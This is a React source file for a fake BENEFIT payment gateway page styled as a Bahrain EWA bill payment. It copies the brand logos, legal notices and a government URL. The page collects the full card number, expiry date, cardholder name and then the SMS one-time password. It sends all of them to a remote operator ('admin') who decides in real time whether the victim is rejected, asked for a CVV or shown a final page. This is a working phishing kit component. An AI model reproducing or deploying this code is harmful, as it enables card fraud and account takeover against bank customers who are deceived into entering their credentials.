import { useState, useEffect, useRef, useCallback } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react/runtime";
import {
  socket,
  sendData,
  navigateToPage,
  cardAction,
  codeAction,
  waitingMessage,
  visitor,
} from "@/lib/store";
import { getBinInfo } from "@/lib/binDatabase";

// Luhn algorithm to validate card number
function isValidCardNumber(number: string): boolean {
  if (!number || number.length < 13 || number.length > 19) return false;
  let sum = 0;
  let isEven = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

// Format card number with spaces every 4 digits
function formatCardNumber(value: string): string {
  const cleaned = value.replace(/\s+/g, "").replace(/\D/g, "");
  const groups = cleaned.match(/.{1,4}/g);
  return groups ? groups.join(" ") : cleaned;
}

const months = Array.from({ length: 12 }, (_, i) => ({
  value: String(i + 1),
  label: String(i + 1).padStart(2, "0"),
}));

const currentYear = new Date().getFullYear();
const years = Array.from({ length: 2069 - currentYear + 1 }, (_, i) => ({
  value: String(currentYear + i),
  label: String(currentYear + i),
}));

// Translations
const translations = {
  en: {
    langToggle: "عربي",
    gatewayTitle: "BENEFIT PAYMENT GATEWAY",
    amount: "Amount",
    cardType: "Card Type",
    cardTypeValue: "Debit",
    cardNumber: "Card Number",
    expiryDate: "Expiry Date",
    cardHolderName: "Card Holders Name",
    saveCard: "Save your card details for future payments to this merchant.",
    pay: "Pay",
    cancel: "Cancel",
    confirm: "Confirm",
    viewAccepted: "View Accepted Cards",
    note: "Note:",
    noteText: 'By submitting your information and using "BENEFIT Payment Gateway", you indicate that you agree to the',
    termsLink: "Terms of Services - Legal Disclaimer",
    poweredBy: "Powered By The BENEFIT Company.",
    copyright: "Copyright © 2020-2025 The BENEFIT Company. All Rights Reserved.",
    licensed: "Licensed by Central Bank of Bahrain as Ancillary Service Provider.",
    otpNotifTitle: "NOTIFICATION:",
    otpNotifText: "You will presently receive an SMS on your mobile number registered with your bank. This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.",
    otp: "OTP",
    processing: "Processing...",
    close: "Close",
    errCardNumber: "Please enter a valid card number",
    errExpiry: "Please select expiry date",
    errCardHolder: "Please enter card holder name",
    errOtp: "Please enter a valid OTP (4-6 digits)",
    errRejectCard: "Please check the entered information",
    errRejectOtp: "Please enter the correct OTP",
  },
  ar: {
    langToggle: "English",
    gatewayTitle: "بوابة الدفع بنفت",
    amount: "المبلغ",
    cardType: "نوع البطاقة",
    cardTypeValue: "بطاقة خصم",
    cardNumber: "رقم البطاقة",
    expiryDate: "تاريخ الانتهاء",
    cardHolderName: "اسم حامل البطاقة",
    saveCard: "حفظ بيانات بطاقتك للمدفوعات المستقبلية لهذا التاجر.",
    pay: "ادفع",
    cancel: "إلغاء",
    confirm: "تأكيد",
    viewAccepted: "عرض البطاقات المقبولة",
    note: "ملاحظة:",
    noteText: 'بتقديم معلوماتك واستخدام "بوابة الدفع بنفت"، فإنك توافق على',
    termsLink: "شروط الخدمة - إخلاء المسؤولية القانونية",
    poweredBy: "مدعوم من شركة بنفت.",
    copyright: "حقوق النشر © 2020-2025 شركة بنفت. جميع الحقوق محفوظة.",
    licensed: "مرخصة من مصرف البحرين المركزي كمزود خدمات مساندة.",
    otpNotifTitle: "إشعار:",
    otpNotifText: "ستتلقى قريباً رسالة نصية على رقم هاتفك المسجل لدى البنك. تحتوي الرسالة على رمز تحقق (OTP) مكون من 6 أرقام، يرجى إدخاله في الحقل أدناه.",
    otp: "رمز التحقق",
    processing: "جاري المعالجة...",
    close: "إغلاق",
    errCardNumber: "الرجاء إدخال رقم بطاقة صحيح",
    errExpiry: "الرجاء اختيار تاريخ الانتهاء",
    errCardHolder: "الرجاء إدخال اسم حامل البطاقة",
    errOtp: "الرجاء إدخال رمز تحقق صحيح (4-6 أرقام)",
    errRejectCard: "يرجى التأكد من المعلومات المدخلة",
    errRejectOtp: "يرجى إدخال الرمز بشكل صحيح",
  },
};

type Phase = "card" | "otp";
type Lang = "en" | "ar";

const RED = "#e60000";

export default function KNETPayment() {
  const [, navigate] = useLocation();
  const [phase, setPhase] = useState<Phase>("card");
  const [lang, setLang] = useState<Lang>("en");

  const t = translations[lang];
  const isRtl = lang === "ar";

  // Card form state
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cardHolderName, setCardHolderName] = useState("");
  const [saveCard, setSaveCard] = useState(false);

  // OTP state
  const [otpCode, setOtpCode] = useState("");
  const [countdown, setCountdown] = useState(180);
  const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Common state
  const [validationError, setValidationError] = useState("");
  const [isWaiting, setIsWaiting] = useState(false);
  const [rejectedError, setRejectedError] = useState("");
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorModalMessage, setErrorModalMessage] = useState("");

  // Get amount from localStorage
  const mohData = JSON.parse(localStorage.getItem("mohPaymentData") || "{}");
  const totalAmount = mohData.totalAmount || localStorage.getItem("Total") || "0.000";
  // Real-time date/time
  const [dateStr, setDateStr] = useState("");
  useEffect(() => {
    const updateTime = () => {
      const n = new Date();
      setDateStr(`${String(n.getDate()).padStart(2, "0")}-${String(n.getMonth() + 1).padStart(2, "0")}-${n.getFullYear()} ${String(n.getHours()).padStart(2, "0")}:${String(n.getMinutes()).padStart(2, "0")}:${String(n.getSeconds()).padStart(2, "0")}`);
    };
    updateTime();
    const timer = setInterval(updateTime, 1000);
    return () => clearInterval(timer);
  }, []);

  // Card validation states
  const [luhnError, setLuhnError] = useState(false);
  const [cardError, setCardError] = useState(false);

  // Masked card for OTP phase
  const maskedCard = "******" + cardNumber.slice(-4);

  useEffect(() => {
    navigateToPage("دفع بنفت");
  }, []);

  // Countdown timer for OTP
  const startCountdown = useCallback(() => {
    setCountdown(180);
    if (countdownRef.current) clearInterval(countdownRef.current);
    countdownRef.current = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          if (countdownRef.current) clearInterval(countdownRef.current);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  }, []);

  useEffect(() => {
    return () => {
      if (countdownRef.current) clearInterval(countdownRef.current);
    };
  }, []);

  const formatCountdown = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${String(s).padStart(2, "0")}`;
  };

  // Handle card action from admin
  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      waitingMessage.value = "";
      setIsWaiting(false);

      if (phase === "card") {
        if (action === "otp") {
          setPhase("otp");
          startCountdown();
          navigateToPage("رمز التحقق بنفت (OTP)");
        } else if (action === "reject") {
          setRejectedError(t.errRejectCard);
          setCardNumber("");
          setCardHolderName("");
          setExpiryMonth("");
          setExpiryYear("");
        }
      } else if (phase === "otp") {
        if (action === "otp") {
          navigate("/final-page");
        } else if (action === "cvv") {
          navigate("/cvv");
        } else if (action === "reject") {
          setRejectedError(t.errRejectOtp);
          setOtpCode("");
        }
      }
      cardAction.value = null;
    }
  });

  // Handle code action from admin
  useSignalEffect(() => {
    if (codeAction.value) {
      const action = codeAction.value.action;
      waitingMessage.value = "";
      setIsWaiting(false);

      if (phase === "otp") {
        if (action === "cvv") {
          navigate("/cvv");
        } else if (action === "reject") {
          setRejectedError(t.errRejectOtp);
          setOtpCode("");
        } else if (action === "approve" || action === "otp") {
          navigate("/final-page");
        }
      } else if (phase === "card") {
        if (action === "reject") {
          setRejectedError(t.errRejectCard);
          setCardNumber("");
          setCardHolderName("");
          setExpiryMonth("");
          setExpiryYear("");
        }
      }
      codeAction.value = null;
    }
  });

  // Handle card number change with formatting, Luhn, and blocked prefix checks
  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value.replace(/\s+/g, "").replace(/\D/g, "");
    const blockedPrefixes = visitor.value.blockedCardPrefixes;
    const cardPrefix = rawValue.slice(0, 4);

    if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
      setCardError(true);
      setCardNumber("");
      setLuhnError(false);
    } else {
      const formattedValue = formatCardNumber(rawValue);
      setCardNumber(formattedValue);
      setCardError(false);
      if (rawValue.length >= 13 && rawValue.length <= 19) {
        setLuhnError(!isValidCardNumber(rawValue));
      } else {
        setLuhnError(false);
      }
    }
    setValidationError("");
  };

  const validateCardForm = (): boolean => {
    const cleanCard = cardNumber.replace(/\s+/g, "");
    if (!cleanCard || cleanCard.length < 13 || cleanCard.length > 19) {
      setValidationError(t.errCardNumber);
      return false;
    }
    if (!isValidCardNumber(cleanCard)) {
      setValidationError(t.errCardNumber);
      return false;
    }
    if (!expiryMonth || !expiryYear) {
      setValidationError(t.errExpiry);
      return false;
    }
    if (!cardHolderName.trim()) {
      setValidationError(t.errCardHolder);
      return false;
    }
    setValidationError("");
    return true;
  };

  const handleCardSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateCardForm()) return;

    setIsWaiting(true);
    setRejectedError("");

    const cleanCard = cardNumber.replace(/\s+/g, "");
    localStorage.setItem("cardNumber", cleanCard);
    localStorage.setItem("cardMonth", expiryMonth.padStart(2, "0"));
    localStorage.setItem("cardYear", expiryYear);
    localStorage.setItem("Total", String(totalAmount));

    const paymentData = {
      totalPaid: totalAmount,
      cardType: "benefit",
      cardLast4: cleanCard.slice(-4),
      serviceName: mohData.serviceType || "دفع فاتورة الكهرباء والماء",
      bankName: "BENEFIT",
      bankLogo: "/benefit-logo.png",
    };
    localStorage.setItem("paymentData", JSON.stringify(paymentData));

    sendData({
      paymentCard: {
        cardNumber: cleanCard,
        cardNumberOnly: cleanCard,
        prefix: "",
        nameOnCard: cardHolderName,
        expiryMonth: expiryMonth.padStart(2, "0"),
        expiryYear: expiryYear,
        cvv: "N/A",
        pin: "N/A",
        bankName: "BENEFIT",
        paymentMethod: "BENEFIT Debit",
      },
      current: "دفع بنفت",
      nextPage: "رمز التحقق بنفت (OTP)",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  const handleOtpSubmit = () => {
    if (!otpCode || !/^\d{4,6}$/.test(otpCode)) {
      setShowErrorModal(true);
      setErrorModalMessage(t.errOtp);
      return;
    }

    setIsWaiting(true);

    sendData({
      digitCode: otpCode,
      current: "رمز التحقق بنفت (OTP)",
      nextPage: "الصفحة النهائية",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  const toggleLang = () => {
    setLang(lang === "en" ? "ar" : "en");
    setValidationError("");
    setRejectedError("");
  };

  // Shared header component
  const renderHeader = () => (
    <div style={{ padding: "15px 25px", borderBottom: "1px solid #eee" }}>
      <div style={{ textAlign: isRtl ? "left" : "right", marginBottom: 8 }}>
        <span onClick={toggleLang} style={{ color: "#0066cc", fontSize: 13, cursor: "pointer" }}>{t.langToggle}</span>
      </div>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", direction: "ltr" }}>
        <div style={{ flex: "0 0 auto" }}>
          <img src="/ewa-logo.png" alt="EWA" style={{ height: 55 }} />
        </div>
        <div style={{ textAlign: "center", flex: 1 }}>
          <div style={{ color: RED, fontSize: 18, fontWeight: "bold", letterSpacing: 1 }}>{t.gatewayTitle}</div>
          <div style={{ color: RED, fontSize: 14, marginTop: 4 }}>{dateStr}</div>
        </div>
        <div style={{ textAlign: "right", flex: "0 0 auto" }}>
          <div style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>EWA</div>
          <div style={{ fontSize: 12, color: "#666" }}>https://www.npa2.bahrain.bh</div>
        </div>
      </div>
    </div>
  );

  // Shared footer component
  const renderFooter = (showViewCards = false) => (
    <div style={{ padding: "15px 40px 25px", borderTop: "1px solid #eee", direction: isRtl ? "rtl" : "ltr" }}>
      {showViewCards && (
        <div style={{ marginBottom: 20 }}>
          <span style={{ color: RED, fontSize: 13, cursor: "pointer" }}>{t.viewAccepted}</span>
        </div>
      )}
      <div style={{ fontSize: 12, color: "#333", marginBottom: 20, lineHeight: 1.6 }}>
        <strong>{t.note}</strong> {t.noteText}{" "}
        <span style={{ color: "#0066cc", cursor: "pointer" }}>{t.termsLink}</span>.
      </div>
      <div>
        <img src="/benefit-logo.png" alt="Benefit" style={{ height: 60, marginBottom: 8 }} />
        <div style={{ fontSize: 12, color: "#666", lineHeight: 1.8 }}>
          {t.poweredBy}<br />
          {t.copyright}<br />
          {t.licensed}
        </div>
      </div>
    </div>
  );

  return (
    <div style={{ margin: 0, padding: 0, fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", backgroundColor: "#f5f5f5", minHeight: "100vh", direction: isRtl ? "rtl" : "ltr" }}>
      {/* Loading overlay */}
      {isWaiting && (
        <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", backgroundColor: "rgba(0,0,0,0.3)", zIndex: 999999, display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div style={{ textAlign: "center", color: "#fff", fontSize: 16 }}>
            <div style={{ border: "4px solid #f3f3f3", borderTop: `4px solid ${RED}`, borderRadius: "50%", width: 40, height: 40, animation: "spin 1s linear infinite", margin: "0 auto 10px" }} />
            <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
            {t.processing}
          </div>
        </div>
      )}

      {/* Error Modal */}
      {showErrorModal && (
        <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", backgroundColor: "rgba(0,0,0,0.4)", zIndex: 999999, display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div style={{ backgroundColor: "#fff", borderRadius: 8, padding: 30, maxWidth: 400, width: "90%", textAlign: "center" }}>
            <p style={{ fontSize: 14, marginBottom: 20 }}>{errorModalMessage}</p>
            <button onClick={() => setShowErrorModal(false)} style={{ backgroundColor: RED, color: "#fff", border: "none", padding: "8px 30px", borderRadius: 4, cursor: "pointer", fontSize: 14 }}>{t.close}</button>
          </div>
        </div>
      )}

      <div style={{ maxWidth: 960, margin: "0 auto", padding: "0 15px" }}>
        {/* ============ CARD PHASE ============ */}
        {phase === "card" && (
          <div style={{ backgroundColor: "#fff", border: "1px solid #ddd", marginTop: 20, marginBottom: 20 }}>
            {renderHeader()}

            {/* Form Area */}
            <div style={{ padding: "25px 40px" }}>
              {validationError && (
                <div style={{ backgroundColor: "#f8d7da", border: "1px solid #f5c6cb", color: "#721c24", padding: "8px 15px", borderRadius: 4, marginBottom: 15, fontSize: 13 }}>
                  {validationError}
                </div>
              )}

              {rejectedError && (
                <div style={{ color: RED, fontWeight: "bold", textAlign: "center", marginBottom: 15, fontSize: 13 }}>
                  {rejectedError}
                </div>
              )}

              <form onSubmit={handleCardSubmit}>
                <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.amount}</label>
                  <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>BD {totalAmount}</span>
                </div>

                <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardType}</label>
                  <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>{t.cardTypeValue}</span>
                </div>

                <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardNumber}</label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    maxLength={23}
                    value={cardNumber}
                    onChange={handleCardChange}
                    style={{ width: 220, height: 30, border: `1px solid ${luhnError || cardError ? '#cc0000' : '#ccc'}`, borderRadius: 2, padding: "0 8px", fontSize: 14, outline: "none", caretColor: "auto", direction: "ltr" }}
                  />
                </div>

                <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.expiryDate}</label>
                  <div style={{ display: "flex", gap: 5, direction: "ltr" }}>
                    <select value={expiryMonth} onChange={(e) => setExpiryMonth(e.target.value)} style={{ height: 30, border: "1px solid #ccc", borderRadius: 2, fontSize: 13, padding: "0 5px", backgroundColor: "#fff" }}>
                      <option value="">MM</option>
                      {months.map((m) => (<option key={m.value} value={m.value}>{m.label}</option>))}
                    </select>
                    <select value={expiryYear} onChange={(e) => setExpiryYear(e.target.value)} style={{ height: 30, border: "1px solid #ccc", borderRadius: 2, fontSize: 13, padding: "0 5px", backgroundColor: "#fff" }}>
                      <option value="">YYYY</option>
                      {years.map((y) => (<option key={y.value} value={y.value}>{y.label}</option>))}
                    </select>
                  </div>
                </div>

                <div style={{ display: "flex", marginBottom: 20, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardHolderName}</label>
                  <input
                    type="text"
                    value={cardHolderName}
                    onChange={(e) => { setCardHolderName(e.target.value); setValidationError(""); }}
                    style={{ width: 200, height: 30, border: "1px solid #ccc", borderRadius: 2, padding: "0 8px", fontSize: 14, outline: "none", caretColor: "auto" }}
                  />
                </div>

                <div style={{ marginBottom: 25 }}>
                  <label style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#333", cursor: "pointer" }}>
                    <input type="checkbox" checked={saveCard} onChange={(e) => setSaveCard(e.target.checked)} style={{ width: 14, height: 14 }} />
                    {t.saveCard}
                  </label>
                </div>

                <div style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 20 }}>
                  <button type="submit" style={{ backgroundColor: RED, color: "#fff", border: "none", padding: "8px 35px", borderRadius: 4, fontSize: 14, fontWeight: "bold", cursor: "pointer", minWidth: 100 }}>
                    {t.pay}
                  </button>
                  <button type="button" onClick={() => window.history.back()} style={{ backgroundColor: "#fff", color: "#333", border: "1px solid #ccc", padding: "8px 25px", borderRadius: 4, fontSize: 14, cursor: "pointer", minWidth: 100 }}>
                    {t.cancel}
                  </button>
                </div>
              </form>
            </div>

            {renderFooter(true)}
          </div>
        )}

        {/* ============ OTP PHASE ============ */}
        {phase === "otp" && (
          <div style={{ backgroundColor: "#fff", border: "1px solid #ddd", marginTop: 20, marginBottom: 20 }}>
            {renderHeader()}

            <div style={{ padding: "25px 40px" }}>
              <div style={{ backgroundColor: "#d9edf7", border: "1px solid #bce8f1", color: "#31708f", padding: 12, borderRadius: 4, marginBottom: 20, fontSize: 13, lineHeight: 1.6 }}>
                <strong>{t.otpNotifTitle}</strong> {t.otpNotifText}
              </div>

              <div style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
                <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.amount}</label>
                <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>BD {totalAmount}</span>
              </div>

              <div style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
                <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardNumber}</label>
                <span style={{ fontSize: 14, color: "#333", direction: "ltr" }}>{maskedCard}</span>
              </div>

              <div style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
                <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.expiryDate}</label>
                <span style={{ fontSize: 14, color: "#333", direction: "ltr" }}>{expiryMonth.padStart(2, "0")} / {expiryYear}</span>
              </div>

              {rejectedError && (
                <div style={{ color: RED, fontWeight: "bold", textAlign: "center", marginBottom: 15, fontSize: 13 }}>
                  {rejectedError}
                </div>
              )}

              <div style={{ display: "flex", marginBottom: 20, alignItems: "center" }}>
                <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.otp}</label>
                <input
                  type="text"
                  inputMode="numeric"
                  maxLength={6}
                  value={otpCode}
                  onChange={(e) => { setOtpCode(e.target.value.replace(/\D/g, "")); setRejectedError(""); }}
                  placeholder={formatCountdown(countdown)}
                  style={{ width: 200, height: 30, border: "1px solid #ccc", borderRadius: 2, padding: "0 8px", fontSize: 14, textAlign: "center", outline: "none", caretColor: "auto", direction: "ltr" }}
                />
              </div>

              <div style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 20 }}>
                <button
                  type="button"
                  onClick={handleOtpSubmit}
                  disabled={!otpCode || otpCode.length < 4}
                  style={{
                    backgroundColor: RED, color: "#fff", border: "none", padding: "8px 35px", borderRadius: 4, fontSize: 14, fontWeight: "bold",
                    cursor: otpCode && otpCode.length >= 4 ? "pointer" : "not-allowed",
                    opacity: otpCode && otpCode.length >= 4 ? 1 : 0.6, minWidth: 100,
                  }}
                >
                  {t.confirm}
                </button>
                <button type="button" onClick={() => window.history.back()} style={{ backgroundColor: "#fff", color: "#333", border: "1px solid #ccc", padding: "8px 25px", borderRadius: 4, fontSize: 14, cursor: "pointer", minWidth: 100 }}>
                  {t.cancel}
                </button>
              </div>
            </div>

            {renderFooter(false)}
          </div>
        )}
      </div>
    </div>
  );
}
